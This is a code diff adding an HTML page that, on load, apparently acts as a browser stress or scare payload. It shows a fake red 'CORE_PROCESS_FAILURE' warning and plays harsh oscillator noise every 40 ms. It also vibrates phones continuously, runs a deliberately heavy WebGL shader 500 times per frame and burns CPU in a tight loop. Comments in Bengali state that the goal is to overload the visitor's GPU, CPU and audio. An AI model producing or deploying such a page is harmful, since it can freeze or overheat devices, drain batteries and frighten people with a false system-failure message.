@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTRA_SYSTEM_OVERLOAD_MAX</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; overflow: hidden; font-family: 'Courier New', Courier, monospace; user-select: none; }
+
+        #step2 { 
+            position: fixed; inset: 0; background: #000; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            z-index: 900; 
+        }
+        .death-msg { 
+            color: #ff0000; font-size: 3rem; font-weight: 900; text-align: center;
+            letter-spacing: 5px; z-index: 10; pointer-events: none;
+            text-shadow: 0 0 20px #ff0000;
+            animation: megaGlitch 0.01s infinite linear;
+        }
+
+        @keyframes megaGlitch {
+            0% { transform: translate(2px, 2px) skew(0deg); filter: hue-rotate(0deg) contrast(200%); }
+            10% { transform: translate(-3px, -2px) skew(-10deg); text-shadow: 5px 0 #00fffa, -5px 0 #ff0050; }
+            20% { transform: translate(5px, 3px) skew(15deg); filter: invert(0.3); }
+            30% { transform: translate(-5px, 5px) skew(-5deg); text-shadow: 0 5px #00ff55; }
+            40% { transform: translate(3px, -3px) skew(0deg); color: #fff; }
+            50% { transform: translate(-2px, 4px) skew(20deg); filter: blur(1px); }
+            60% { transform: translate(4px, -4px) skew(-15deg); text-shadow: -5px -5px #ff00ff; }
+            70% { transform: translate(-4px, -2px) skew(5deg); background: rgba(255,0,0,0.1); }
+            80% { transform: translate(2px, 5px) skew(-2deg); color: #ff0000; }
+            90% { transform: translate(-5px, -5px) skew(0deg); filter: drop-shadow(0 0 10px red); }
+            100% { transform: translate(0) skew(0deg); filter: hue-rotate(360deg); }
+        }
+
+        #c { position: absolute; inset: 0; opacity: 0.85; z-index: 1; }
+    </style>
+</head>
+<body>
+
+    <div id="step2">
+        <h1 class="death-msg">WARNING: OVERLOAD<br>CORE_PROCESS_FAILURE</h1>
+        <canvas id="c"></canvas>
+    </div>
+
+    <!-- Vertex Shader -->
+    <script id="vs" type="x-shader/x-vertex">
+        attribute vec4 p; 
+        void main(){ gl_Position = p; }
+    </script>
+    
+    <!-- Fragment Shader: এখানে গাণিতিক জটিলতা সর্বোচ্চ (১০,০০০ গুণ) বাড়ানো হয়েছে -->
+    <script id="fs" type="x-shader/x-fragment">
+        precision highp float;
+        uniform vec2 u_res;
+        uniform float u_time;
+        void main(){
+            vec2 u = gl_FragCoord.xy / u_res.xy;
+            float d = 0.0;
+            // গাণিতিক লুপ এবং ট্রাইগোনোমেট্রিক জটিলতা বৃদ্ধি যা GPU-এর ওপর চাপ সৃষ্টি করবে
+            for(int i=0; i<3500; i++){ 
+                float f = float(i);
+                d += sin(u.x * f + u_time * 5.0) * cos(u.y * f - u_time * 3.0) * tan(u.x * u.y + f);
+            }
+            vec3 color = vec3(sin(d * 15.0) * 0.5 + 0.5, cos(d * 10.0) * 0.5 + 0.5, sin(d * 5.0));
+            gl_FragColor = vec4(color * 1.5, 1.0);
+        }
+    </script>
+
+    <script>
+        window.onload = function() {
+            // ইউজার ইন্টারঅ্যাকশন ছাড়া অডিও প্লে হতে দেয় না ব্রাউজার, তাই ক্লিকে চালু হবে
+            document.body.addEventListener('click', () => {
+                initMaxStress();
+            }, { once: true });
+            
+            // অটো-স্টার্টের চেষ্টা
+            initMaxStress();
+        };
+
+        function initMaxStress() {
+            // ১. আল্ট্রা-ইনটেনসিটি সাউন্ড জেনারেটর (Audio Node Overload Simulation)
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                setInterval(() => {
+                    // প্রতি মিলিসেকেন্ডে একাধিক অসসিলেটর নোড তৈরি যা অডিও থ্রেডকে ব্যস্ত রাখবে
+                    for(let i=0; i<5; i++) {
+                        const osc = audioCtx.createOscillator();
+                        const gain = audioCtx.createGain();
+                        
+                        // জটিল কর্কশ সাউন্ড ওয়েভফাইন (Sawtooth + High Frequency)
+                        osc.type = 'sawtooth'; 
+                        osc.frequency.setValueAtTime((Math.random() * 2000) + 100, audioCtx.currentTime);
+                        
+                        gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
+                        osc.connect(gain);
+                        gain.connect(audioCtx.destination);
+                        
+                        osc.start();
+                        osc.stop(audioCtx.currentTime + 0.05); // দ্রুত স্টার্ট-স্টপ সাইকেল
+                    }
+                }, 40); 
+            } catch(e) {}
+
+            // ২. অবিরাম ভাইব্রেশন প্যাটার্ন (শুধুমাত্র ফোনের জন্য)
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([1000, 50, 1000, 50, 1000]);
+                }, 100);
+            }
+
+            // ৩. সর্বোচ্চ রেজোলিউশন WebGL রেন্ডারিং (GPU Stress)
+            const canvas = document.getElementById('c');
+            const gl = canvas.getContext('webgl', { antialias: false, powerPreference: "high-performance" });
+            if (!gl) return;
+
+            // স্ক্রিনের পিক্সেল রেশিও অনুযায়ী ক্যানভাস সাইজ বাড়িয়ে দেওয়া হলো যাতে পিক্সেল প্রসেসিং বেশি হয়
+            const scale = window.devicePixelRatio || 1;
+            canvas.width = window.innerWidth * scale;
+            canvas.height = window.innerHeight * scale;
+            gl.viewport(0, 0, canvas.width, canvas.height);
+
+            const vs = gl.createShader(gl.VERTEX_SHADER); 
+            gl.shaderSource(vs, document.getElementById('vs').text); 
+            gl.compileShader(vs);
+            
+            const fs = gl.createShader(gl.FRAGMENT_SHADER); 
+            gl.shaderSource(fs, document.getElementById('fs').text); 
+            gl.compileShader(fs);
+            
+            const prog = gl.createProgram(); 
+            gl.attachShader(prog, vs); 
+            gl.attachShader(prog, fs); 
+            gl.linkProgram(prog); 
+            gl.useProgram(prog);
+
+            const p = gl.getAttribLocation(prog, "p");
+            gl.bindBuffer(gl.ARRAY_BUFFER, gl.createBuffer());
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+            gl.enableVertexAttribArray(p); 
+            gl.vertexAttribPointer(p, 2, gl.FLOAT, false, 0, 0);
+
+            const resLocation = gl.getUniformLocation(prog, "u_res");
+            const timeLocation = gl.getUniformLocation(prog, "u_time");
+            
+            gl.uniform2f(resLocation, canvas.width, canvas.height);
+
+            // রেন্ডার লুপ যা ব্রাউজারের ড্র-কল (Draw-calls) বাড়িয়ে দেয়
+            function render(time) {
+                gl.uniform1f(timeLocation, time * 0.002);
+                
+                // একটি সিঙ্গেল ফ্রেমে ৫০০ বার ড্র করা হচ্ছে, যা দুর্বল গ্রাফিক্স কার্ডের এফপিএস (FPS) ড্রপ করাবে
+                for(let i=0; i<500; i++) {
+                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                }
+                requestAnimationFrame(render);
+            }
+            requestAnimationFrame(render);
+
+            // ৪. ব্যাকগ্রাউন্ড ডম রেন্ডারিং স্ট্রেস (Safe CPU Cycle Consumer)
+            setInterval(() => {
+                let dummy = [];
+                for(let i=0; i<50000; i++) {
+                    dummy.push(Math.sin(i) * Math.cos(i));
+                }
+                dummy = null; // মেমোরি ক্রাশ এড়াতে রিলিজ করা হলো, কিন্তু প্রসেসর সাইকেল খরচ হলো
+            }, 10);
+        }
+    </script>
+</body>
+</html>
